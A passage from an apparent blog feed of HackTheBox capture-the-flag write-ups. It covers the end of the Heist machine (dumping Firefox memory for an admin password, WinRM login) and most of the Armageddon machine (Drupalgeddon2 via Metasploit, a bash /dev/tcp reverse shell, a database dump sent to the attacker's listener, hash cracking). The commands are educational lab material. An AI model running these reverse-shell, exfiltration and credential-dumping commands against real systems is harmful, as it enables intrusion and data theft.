<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">*Evil-WinRM* PS C:<span class="se">\&gt;</span> net use <span class="se">\\</span>10.10.14.83<span class="se">\e</span>f /user:ef ef
The <span class="nb">command</span> completed successfully.

*Evil-WinRM* PS C:<span class="se">\&gt;</span> <span class="nb">cd</span> <span class="se">\\</span>10.10.14.83<span class="se">\e</span>f
*Evil-WinRM* PS Microsoft.PowerShell.Core<span class="se">\F</span>ileSystem::<span class="se">\\</span>10.10.14.83<span class="se">\e</span>f&gt; 
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-administrator">Shell as Administrator</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>In <code>chase</code>&rsquo;s Desktop there is another file called <code>todo.txt</code>. As the name implies, it contains to-do list.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\D</span>esktop&gt; <span class="nb">type</span> todo.txt
Stuff to-do:
1. Keep checking the issues list.
2. Fix the router config.

Done:
1. Restricted access <span class="k">for</span> guest user.
</code></pre></div><p>While looking at the WinPEAS output, I noticed multiple Firefox processes were running.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">  [+] Current TCP Listening Ports
   [?] Check for services restricted from the outside 
  Enumerating IPv4 connections
         
  Protocol   Local Address         Local Port    Remote Address        Remote Port     State             Process ID      Process Name

...[SNIP]...

  TCP        127.0.0.1             49672         127.0.0.1             49673           Established       6868            C:\Program Files\Mozilla Firefox\firefox.exe
  TCP        127.0.0.1             49673         127.0.0.1             49672           Established       6868            C:\Program Files\Mozilla Firefox\firefox.exe
  TCP        127.0.0.1             49674         127.0.0.1             49675           Established       6016            C:\Program Files\Mozilla Firefox\firefox.exe
  TCP        127.0.0.1             49675         127.0.0.1             49674           Established       6016            C:\Program Files\Mozilla Firefox\firefox.exe
  TCP        127.0.0.1             49680         127.0.0.1             49681           Established       5496            C:\Program Files\Mozilla Firefox\firefox.exe
  TCP        127.0.0.1             49681         127.0.0.1             49680           Established       5496            C:\Program Files\Mozilla Firefox\firefox.exe
  TCP        127.0.0.1             49682         127.0.0.1             49683           Established       2068            C:\Program Files\Mozilla Firefox\firefox.exe
  TCP        127.0.0.1             49683         127.0.0.1             49682           Established       2068            C:\Program Files\Mozilla Firefox\firefox.exe
</code></pre></div><p>Based on the to-do list, this means that user <code>chase</code> periodically open a browser to check the issues list.</p>
<h4 id="dump-firefox-process">Dump Firefox Process</h4>
<p>I will employs <code>procdump64.exe</code> to dump the Firefox data from the memory.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">*Evil-WinRM* PS C:<span class="se">\i</span>amf&gt; <span class="se">\\</span>10.10.14.83<span class="se">\e</span>f<span class="se">\p</span>rocdump64.exe -accepteula -ma <span class="m">6868</span>

ProcDump v10.0 - Sysinternals process dump utility
Copyright <span class="o">(</span>C<span class="o">)</span> 2009-2020 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

<span class="o">[</span>23:07:07<span class="o">]</span> Dump <span class="m">1</span> initiated: C:<span class="se">\i</span>amf<span class="se">\f</span>irefox.exe_210712_230707.dmp
<span class="o">[</span>23:07:07<span class="o">]</span> Dump <span class="m">1</span> writing: Estimated dump file size is <span class="m">535</span> MB.
<span class="o">[</span>23:07:08<span class="o">]</span> Dump <span class="m">1</span> complete: <span class="m">536</span> MB written in 1.5 seconds
<span class="o">[</span>23:07:09<span class="o">]</span> Dump count reached.
</code></pre></div><p>Because I don&rsquo;t want to grab that fatty <code>536 MB</code> file,  I will use  <code>strings64.exe</code> and redirect the output to a text file to get some readable part from the dump file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">*Evil-WinRM* PS C:<span class="se">\i</span>amf&gt; cmd /c <span class="s2">&#34;\\10.10.14.83\ef\strings64.exe -accepteula firefox.exe_210712_230707.dmp &gt; foxdump.txt&#34;</span>
cmd.exe : 
    + CategoryInfo          : NotSpecified: <span class="o">(</span>:String<span class="o">)</span> <span class="o">[]</span>, RemoteException
    + FullyQualifiedErrorId : NativeCommandError
Strings v2.54 - Search <span class="k">for</span> ANSI and Unicode strings in binary images.
Copyright <span class="o">(</span>C<span class="o">)</span> 1999-2021 Mark Russinovich
Sysinternals - www.sysinternals.com

*Evil-WinRM* PS C:<span class="se">\i</span>amf&gt; dir


    Directory: C:<span class="se">\i</span>amf


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        7/12/2021  11:07 PM      <span class="m">547841456</span> firefox.exe_210712_230707.dmp
-a----        7/12/2021  11:18 PM      <span class="m">136871696</span> foxdump.txt
</code></pre></div><p>Searching for a string &ldquo;password&rdquo; in the converted dump file reveals the password used by admin (<code>4dD!5}x/re8]FBuZ</code>).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">*Evil-WinRM* PS C:<span class="se">\i</span>amf&gt; gc foxdump.txt <span class="p">|</span> <span class="k">select</span>-string <span class="s2">&#34;password&#34;</span>

<span class="s2">&#34;C:\Program Files\Mozilla Firefox\firefox.exe&#34;</span> localhost/login.php?login_username<span class="o">=</span>admin@support.htb<span class="p">&amp;</span><span class="nv">login_password</span><span class="o">=</span>4dD!5<span class="o">}</span>x/re8<span class="o">]</span>FBuZ<span class="p">&amp;</span><span class="nv">login</span><span class="o">=</span>
...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><p><strong>[Side note]</strong></p>
<p>If this was done by automation script, maybe I could try to drop a packet sniffer before dumping the whole process.</p>
<p><img class="img-container" src="imgs/image-20210726192951302.png" alt="image-20210726192951302"  />
</p>
<h4 id="winrm---administrator">WinRM - Administrator</h4>
<p>The password <code>4dD!5}x/re8]FBuZ</code> is reused for administrator account.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «heist» «10.10.14.83» 
$ evil-winrm -i 10.10.10.149 -u <span class="s1">&#39;Administrator&#39;</span> -p <span class="s1">&#39;4dD!5}x/re8]FBuZ&#39;</span>

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; whoami<span class="p">;</span> hostname<span class="p">;</span> ipconfig<span class="p">;</span> <span class="nb">type</span> ..<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
supportdesk<span class="se">\a</span>dministrator
SupportDesk

Windows IP Configuration


Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . :
   IPv6 Address. . . . . . . . . . . : dead:beef::60f9:33ef:49c0:aa91
   Link-local IPv6 Address . . . . . : fe80::60f9:33ef:49c0:aa91%15
   IPv4 Address. . . . . . . . . . . : 10.10.10.149
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:271c%15
                                       10.10.10.2
50dfa...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><hr>
<h2 id="references">Reference(s)</h2>
<ul>
<li><a href="https://davidbombal.com/cisco-type-7-password-decryption/">https://davidbombal.com/cisco-type-7-password-decryption/</a></li>
<li><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump">https://docs.microsoft.com/en-us/sysinternals/downloads/procdump</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Armageddon</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-armageddon/</link>
      <pubDate>Mon, 26 Jul 2021 11:21:43 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-armageddon/</guid>
      <description>Armageddon is an easy Linux machine from HackTheBox that features an instance of Drupal 7 CMS. Enumeration of the CMS reveals that it is vulnerable to a remote code execution. With help of Metasploit module, I&amp;rsquo;m able to compromise the web server. Examining the Drupal configuration files discovers a set of database credentials, which can be used to login and dump the user credentials from MySQL database. The user is allowed to install a snap package as root user, and this could be leveraged to obtain root shell.</description>
      <content:encoded><![CDATA[<p>Armageddon is an easy Linux machine from HackTheBox that features an instance of Drupal 7 CMS. Enumeration of the CMS reveals that it is vulnerable to a remote code execution. With help of Metasploit module, I&rsquo;m able to compromise the web server. Examining the Drupal configuration files discovers a set of database credentials, which can be used to login and dump the user credentials from MySQL database. The user is allowed to install a snap package as root user, and this could be leveraged to obtain root shell.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>Drupal 7 exploitation using Drupalgeddon2</li>
<li>Privilege escalation via malicious snap package</li>
</ul>
<h3 id="tools">Tools</h3>
<ul>
<li>Nmap</li>
<li>Metasploit</li>
<li><a href="https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py">Dirty_sockv2.py</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>An initial <code>nmap</code> scan discovers two open ports: SSH on 22 and an Apache Web Server serving Drupal 7 on 80.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «armageddon» «10.10.14.4» 
$ nmap -sC -sV -oA scans/10-initial-armageddon 10.129.90.96
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-03-29 22:27 EDT
Nmap scan report <span class="k">for</span> 10.129.90.96
Host is up <span class="o">(</span>0.30s latency<span class="o">)</span>.
Not shown: <span class="m">998</span> closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 <span class="o">(</span>protocol 2.0<span class="o">)</span>
<span class="p">|</span> ssh-hostkey: 
<span class="p">|</span>   <span class="m">2048</span> 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 <span class="o">(</span>RSA<span class="o">)</span>
<span class="p">|</span>   <span class="m">256</span> 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc <span class="o">(</span>ECDSA<span class="o">)</span>
<span class="p">|</span>_  <span class="m">256</span> 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.6 <span class="o">((</span>CentOS<span class="o">)</span> PHP/5.4.16<span class="o">)</span>
<span class="p">|</span>_http-favicon: Unknown favicon MD5: 1487A9908F898326EBABFFFD2407920D
<span class="p">|</span>_http-generator: Drupal <span class="m">7</span> <span class="o">(</span>http://drupal.org<span class="o">)</span>
<span class="p">|</span> http-methods: 
<span class="p">|</span>_  Supported Methods: GET HEAD POST OPTIONS
<span class="p">|</span> http-robots.txt: <span class="m">36</span> disallowed entries <span class="o">(</span><span class="m">15</span> shown<span class="o">)</span>
<span class="p">|</span> /includes/ /misc/ /modules/ /profiles/ /scripts/ 
<span class="p">|</span> /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
<span class="p">|</span> /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
<span class="p">|</span>_/LICENSE.txt /MAINTAINERS.txt
<span class="p">|</span>_http-server-header: Apache/2.4.6 <span class="o">(</span>CentOS<span class="o">)</span> PHP/5.4.16
<span class="p">|</span>_http-title: Welcome to  Armageddon <span class="p">|</span>  Armageddon

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
<span class="c1"># Nmap done at Mon Mar 29 22:28:01 2021 -- 1 IP address (1 host up) scanned in 51.04 seconds</span>
</code></pre></div><p>Nmap also identified the OS as CentOs, so there is a chance that it would only allow outgoing connection to ports below 1024.</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80----website">TCP 80 -  Website</h3>
<p>Visiting port 80 presents a page that has no other content except a login form.</p>
<p><img class="img-container" src="imgs/image-20210330094613154.png" alt="image-20210330094613154"  />
</p>
<p>A previous <code>nmap</code> scan detected that there was a changelog file. Poking <code>/CHANGELOG.txt</code> discovers the exact version of this Drupal instance.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «armageddon» «10.10.14.4» 
$ curl -s http://10.129.90.96/CHANGELOG.txt 
Drupal 7.56, 2017-06-21
-----------------------
- Fixed security issues <span class="o">(</span>access bypass<span class="o">)</span>. See SA-CORE-2017-003.
...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><h4 id="finding-vulnerabilities">Finding Vulnerabilities</h4>
<p><code>searchsploit</code> pops up a lot of exploit results related to Drupal 7. But, based on the results, it is clear that the current version of Drupal seems to be vulnerable to remote code execution.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «armageddon» «10.10.14.4» 
$ searchsploit Drupal <span class="m">7</span>
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     <span class="p">|</span>  Path
----------------------------------------------------------------------------------- ---------------------------------
Drupal 7.0 &lt; 7.31 - <span class="s1">&#39;Drupalgeddon&#39;</span> SQL Injection <span class="o">(</span>Add Admin User<span class="o">)</span>                  <span class="p">|</span> php/webapps/34992.py
Drupal 7.0 &lt; 7.31 - <span class="s1">&#39;Drupalgeddon&#39;</span> SQL Injection <span class="o">(</span>Admin Session<span class="o">)</span>                   <span class="p">|</span> php/webapps/44355.php
Drupal 7.0 &lt; 7.31 - <span class="s1">&#39;Drupalgeddon&#39;</span> SQL Injection <span class="o">(</span>PoC<span class="o">)</span> <span class="o">(</span>Reset Password<span class="o">)</span> <span class="o">(</span>1<span class="o">)</span>        <span class="p">|</span> php/webapps/34984.py
Drupal 7.0 &lt; 7.31 - <span class="s1">&#39;Drupalgeddon&#39;</span> SQL Injection <span class="o">(</span>PoC<span class="o">)</span> <span class="o">(</span>Reset Password<span class="o">)</span> <span class="o">(</span>2<span class="o">)</span>        <span class="p">|</span> php/webapps/34993.php
Drupal 7.0 &lt; 7.31 - <span class="s1">&#39;Drupalgeddon&#39;</span> SQL Injection <span class="o">(</span>Remote Code Execution<span class="o">)</span>           <span class="p">|</span> php/webapps/35150.php
Drupal 7.12 - Multiple Vulnerabilities                                             <span class="p">|</span> php/webapps/18564.txt
Drupal 7.x Module Services - Remote Code Execution                                 <span class="p">|</span> php/webapps/41564.php
Drupal &lt; 4.7.6 - Post Comments Remote Command Execution                            <span class="p">|</span> php/webapps/3313.pl
Drupal &lt; 7.34 - Denial of Service                                                  <span class="p">|</span> php/dos/35415.txt
Drupal &lt; 7.34 - Denial of Service                                                  <span class="p">|</span> php/dos/35415.txt
Drupal &lt; 7.58 - <span class="s1">&#39;Drupalgeddon3&#39;</span> <span class="o">(</span>Authenticated<span class="o">)</span> Remote Code <span class="o">(</span>Metasploit<span class="o">)</span>           <span class="p">|</span> php/webapps/44557.rb
Drupal &lt; 7.58 - <span class="s1">&#39;Drupalgeddon3&#39;</span> <span class="o">(</span>Authenticated<span class="o">)</span> Remote Code Execution <span class="o">(</span>PoC<span class="o">)</span>        <span class="p">|</span> php/webapps/44542.txt
Drupal &lt; 7.58 / &lt; 8.3.9 / &lt; 8.4.6 / &lt; 8.5.1 - <span class="s1">&#39;Drupalgeddon2&#39;</span> Remote Code Executio <span class="p">|</span> php/webapps/44449.rb
Drupal &lt; 7.58 / &lt; 8.3.9 / &lt; 8.4.6 / &lt; 8.5.1 - <span class="s1">&#39;Drupalgeddon2&#39;</span> Remote Code Executio <span class="p">|</span> php/webapps/44449.rb
Drupal &lt; 8.3.9 / &lt; 8.4.6 / &lt; 8.5.1 - <span class="s1">&#39;Drupalgeddon2&#39;</span> Remote Code Execution <span class="o">(</span>Metasp <span class="p">|</span> php/remote/44482.rb
Drupal &lt; 8.3.9 / &lt; 8.4.6 / &lt; 8.5.1 - <span class="s1">&#39;Drupalgeddon2&#39;</span> Remote Code Execution <span class="o">(</span>PoC<span class="o">)</span>   <span class="p">|</span> php/webapps/44448.py
Drupal &lt; 8.5.11 / &lt; 8.6.10 - RESTful Web Services unserialize<span class="o">()</span> Remote Command Exe <span class="p">|</span> php/remote/46510.rb
Drupal &lt; 8.6.10 / &lt; 8.5.11 - REST Module Remote Code Execution                     <span class="p">|</span> php/webapps/46452.txt
Drupal &lt; 8.6.9 - REST Module Remote Code Execution                                 <span class="p">|</span> php/webapps/46459.py
Drupal avatar_uploader v7.x-1.0-beta8 - Arbitrary File Disclosure                  <span class="p">|</span> php/webapps/44501.txt
Drupal Module CKEditor &lt; 4.1WYSIWYG <span class="o">(</span>Drupal 6.x/7.x<span class="o">)</span> - Persistent Cross-Site Scrip <span class="p">|</span> php/webapps/25493.txt
Drupal Module Coder &lt; 7.x-1.3/7.x-2.6 - Remote Code Execution                      <span class="p">|</span> php/remote/40144.php
Drupal Module Cumulus 5.x-1.1/6.x-1.4 - <span class="s1">&#39;tagcloud&#39;</span> Cross-Site Scripting            <span class="p">|</span> php/webapps/35397.txt
Drupal Module RESTWS 7.x - PHP Remote Code Execution <span class="o">(</span>Metasploit<span class="o">)</span>                  <span class="p">|</span> php/remote/40130.rb
----------------------------------------------------------------------------------- ---------------------------------
</code></pre></div><p>Since &ldquo;Drupalgeddon2&rdquo; exploits doesn&rsquo;t state it requires authentication, I will give it a try.</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-apache">Shell as apache</h3>
<h4 id="metasploit---drupalgeddon-2">Metasploit - Drupalgeddon 2</h4>
<p>Metasploit has a module for Drupalgeddon2 ( <code>exploit/unix/webapp/drupal_drupalgeddon2</code>). On my first attempt, it returned with no session.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">msf6 exploit<span class="o">(</span>unix/webapp/drupal_drupalgeddon2<span class="o">)</span> &gt; <span class="nb">set</span> RHOSTS 10.129.90.96
<span class="nv">RHOSTS</span> <span class="o">=</span>&gt; 10.129.90.96
msf6 exploit<span class="o">(</span>unix/webapp/drupal_drupalgeddon2<span class="o">)</span> &gt; <span class="nb">set</span> LHOST tun0
<span class="nv">LHOST</span> <span class="o">=</span>&gt; tun0
msf6 exploit<span class="o">(</span>unix/webapp/drupal_drupalgeddon2<span class="o">)</span> &gt; <span class="nb">set</span> LPORT <span class="m">9001</span>
<span class="nv">LPORT</span> <span class="o">=</span>&gt; <span class="m">9001</span>
msf6 exploit<span class="o">(</span>unix/webapp/drupal_drupalgeddon2<span class="o">)</span> &gt; run

<span class="o">[</span>*<span class="o">]</span> Started reverse TCP handler on 10.10.14.4:9001 
<span class="o">[</span>*<span class="o">]</span> Executing automatic check <span class="o">(</span>disable AutoCheck to override<span class="o">)</span>
<span class="o">[</span>+<span class="o">]</span> The target is vulnerable.
<span class="o">[</span>*<span class="o">]</span> Exploit completed, but no session was created
</code></pre></div><p>By assuming that the firewall blocks all outgoing ports except well-known, I changed my listening port to 443, and now it successfully opened a session.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">msf6 exploit<span class="o">(</span>unix/webapp/drupal_drupalgeddon2<span class="o">)</span> &gt; <span class="nb">set</span> lport <span class="m">443</span>
<span class="nv">lport</span> <span class="o">=</span>&gt; <span class="m">443</span>
msf6 exploit<span class="o">(</span>unix/webapp/drupal_drupalgeddon2<span class="o">)</span> &gt; run

<span class="o">[</span>*<span class="o">]</span> Started reverse TCP handler on 10.10.14.4:443 
<span class="o">[</span>*<span class="o">]</span> Executing automatic check <span class="o">(</span>disable AutoCheck to override<span class="o">)</span>
<span class="o">[</span>+<span class="o">]</span> The target is vulnerable.
<span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">39282</span> bytes<span class="o">)</span> to 10.129.90.96
<span class="o">[</span>*<span class="o">]</span> Meterpreter session <span class="m">1</span> opened <span class="o">(</span>10.10.14.4:443 -&gt; 10.129.90.96:44612<span class="o">)</span> at 2021-03-29 23:47:59 -0400

meterpreter &gt; shell
Process <span class="m">9611</span> created.
Channel <span class="m">0</span> created.
whoami
apache
<span class="nb">pwd</span>
/var/www/html
</code></pre></div><p>I sent the following command because I wanted to change my shell, so I could do the PTY trick.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">$ bash -c <span class="s1">&#39;bash -i &gt;&amp; /dev/tcp/10.10.14.4/88 0&gt;&amp;1&#39;</span>
</code></pre></div><p>On my listener</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ kali@kali «armageddon» «10.10.14.4» 
$ nc -nvlp <span class="m">88</span>  
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">88</span> ...
connect to <span class="o">[</span>10.10.14.4<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.129.90.96<span class="o">]</span> <span class="m">58422</span>
bash: no job control in this shell
bash-4.2$ 
</code></pre></div><p>However, I&rsquo;m unable to get the PTY trick working. It always returns the following error.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">bash-4.2$ python3 -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
python3 -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
  File <span class="s2">&#34;&lt;string&gt;&#34;</span>, line 1, in &lt;module&gt;
  File <span class="s2">&#34;/usr/lib64/python3.6/pty.py&#34;</span>, line 154, in spawn
    pid, <span class="nv">master_fd</span> <span class="o">=</span> fork<span class="o">()</span>
  File <span class="s2">&#34;/usr/lib64/python3.6/pty.py&#34;</span>, line 96, in fork
    master_fd, <span class="nv">slave_fd</span> <span class="o">=</span> openpty<span class="o">()</span>
  File <span class="s2">&#34;/usr/lib64/python3.6/pty.py&#34;</span>, line 29, in openpty
    master_fd, <span class="nv">slave_name</span> <span class="o">=</span> _open_terminal<span class="o">()</span>
  File <span class="s2">&#34;/usr/lib64/python3.6/pty.py&#34;</span>, line 59, in _open_terminal
    raise OSError<span class="o">(</span><span class="s1">&#39;out of pty devices&#39;</span><span class="o">)</span>
OSError: out of pty devices
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-brucetherealadmin">Shell as brucetherealadmin</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>There is only one user other than root who has a login shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">bash-4.2$ cat /etc/passwd <span class="p">|</span> grep sh$
root:x:0:0:root:/root:/bin/bash
brucetherealadmin:x:1000:1000::/home/brucetherealadmin:/bin/bash
</code></pre></div><p>Running a recursive grep to find passwords under the web root directory pops one password out from <code>settings.php</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">bash-4.2$ <span class="nb">pwd</span>
/var/www/html
bash-4.2$ grep -Ri <span class="s2">&#34;password&#34;</span> 2&gt;/dev/null
...<span class="o">[</span>SNIP<span class="o">]</span>...
sites/default/settings.php:      <span class="s1">&#39;password&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;CQHEy@9M*m23gBVj&#39;</span>,
...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><p>Looking at the contents of  <code>settings.php</code> reveals a database credential.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">bash-4.2$ cat sites/default/settings.php
<span class="nv">$databases</span> <span class="o">=</span> array <span class="o">(</span>
  <span class="s1">&#39;default&#39;</span> <span class="o">=</span>&gt; 
  array <span class="o">(</span>
    <span class="s1">&#39;default&#39;</span> <span class="o">=</span>&gt; 
    array <span class="o">(</span>
      <span class="s1">&#39;database&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;drupal&#39;</span>,
      <span class="s1">&#39;username&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;drupaluser&#39;</span>,
      <span class="s1">&#39;password&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;CQHEy@9M*m23gBVj&#39;</span>,
      <span class="s1">&#39;host&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;localhost&#39;</span>,
      <span class="s1">&#39;port&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;&#39;</span>,
      <span class="s1">&#39;driver&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;mysql&#39;</span>,
      <span class="s1">&#39;prefix&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;&#39;</span>,
    <span class="o">)</span>,
  <span class="o">)</span>,
<span class="o">)</span><span class="p">;</span>
</code></pre></div><h4 id="mysql-access">MySQL Access</h4>
<p>The password didn&rsquo;t work for user <code>brucetherealadmin</code>, but it did work for the database (of course). Unfortunately, because I&rsquo;m not in a TTY, I couldn&rsquo;t get into MySQL interactive shell, so instead, I dump the database using <code>mysqldump</code> and exfil the output to my attacking machine.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">bash-4.2$ mysqldump -u drupaluser -p<span class="s1">&#39;CQHEy@9M*m23gBVj&#39;</span> drupal &gt; drupal.dump<span class="p">;</span> cat drupal.dump &gt; /dev/tcp/10.10.14.4/88
</code></pre></div><p>On my Kali.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ kali@kali «loot» «10.10.14.4» 
$ nc -nvlp <span class="m">88</span> &gt; drupal.dump
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">88</span> ...
connect to <span class="o">[</span>10.10.14.4<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.129.90.96<span class="o">]</span> <span class="m">58444</span>
</code></pre></div><p>Examination of the dumped data reveals the structure of  <code>users</code> table.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="p">...[</span><span class="n">SNIP</span><span class="p">]...</span><span class="w">
</span><span class="w"></span><span class="k">DROP</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="k">IF</span><span class="w"> </span><span class="k">EXISTS</span><span class="w"> </span><span class="o">`</span><span class="n">users</span><span class="o">`</span><span class="p">;</span><span class="w">
</span><span class="w"></span><span class="cm">/*!40101 SET @saved_cs_client     = @@character_set_client */</span><span class="p">;</span><span class="w">
</span><span class="w"></span><span class="cm">/*!40101 SET character_set_client = utf8 */</span><span class="p">;</span><span class="w">
</span><span class="w"></span><span class="k">CREATE</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="o">`</span><span class="n">users</span><span class="o">`</span><span class="w"> </span><span class="p">(</span><span class="w">
</span><span class="w">  </span><span class="o">`</span><span class="n">uid</span><span class="o">`</span><span class="w"> </span><span class="kt">int</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span><span class="w"> </span><span class="k">unsigned</span><span class="w"> </span><span class="k">NOT</span><span class="w"> </span><span class="no">NULL</span><span class="w"> </span><span class="k">DEFAULT</span><span class="w"> </span><span class="s1">&#39;0&#39;</span><span class="w"> </span><span class="n">COMMENT</span><span class="w"> </span><span class="s1">&#39;Primary Key: Unique user ID.&#39;</span><span class="p">,</span><span class="w">
</span><span class="w">  </span><span class="o">`</span><span class="n">name</span><span class="o">`</span><span class="w"> </span><span class="kt">varchar</span><span class="p">(</span><span class="mi">60</span><span class="p">)</span><span class="w"> </span><span class="k">NOT</span><span class="w"> </span><span class="no">NULL</span><span class="w"> </span><span class="k">DEFAULT</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span><span class="n">COMMENT</span><span class="w"> </span><span class="s1">&#39;Unique user name.&#39;</span><span class="p">,</span><span class="w">
</span><span class="w">  </span><span class="o">`</span><span class="n">pass</span><span class="o">`</span><span class="w"> </span><span class="kt">varchar</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span><span class="w"> </span><span class="k">NOT</span><span class="w"> </span><span class="no">NULL</span><span class="w"> </span><span class="k">DEFAULT</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span><span class="n">COMMENT</span><span class="w"> </span><span class="s1">&#39;User’s password (hashed).&#39;</span><span class="p">,</span><span class="w">
</span><span class="w"></span><span class="p">...[</span><span class="n">SNIP</span><span class="p">]...</span><span class="w">
</span></code></pre></div><p>Knowing the <code>users</code> table structure, I could use the MySQL <code>-e</code> option to retrieve the contents of column <code>name</code> and column <code>pass</code>  from the <code>users</code> table. This returns a password hash of <code>brucetherealadmin</code>, and I will have to crack this.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">bash-4.2$ mysql -h localhost -u drupaluser -p<span class="s1">&#39;CQHEy@9M*m23gBVj&#39;</span> drupal -e <span class="s1">&#39;select name, pass from users&#39;</span>
name    pass
brucetherealadmin       <span class="nv">$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97</span>.oOsUf1xAhaadURt
</code></pre></div><h4 id="password-crack">Password Crack</h4>
<p>The password has been recovered back to plain text using <code>hashcat</code> and <code>rockyou.txt</code>.</p>
<pre><code>C:\tools\hashcat6&gt; hashcat.exe -m 7900 &quot;$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt&quot; rockyou.txt
...[SNIP]...
$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt:booboo

Session..........: hashcat
Status...........: Cracked
Hash.Name........: Drupal7
Hash.Target......: $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt
Time.Started.....: Tue Mar 30 12:03:57 2021 (3 secs)
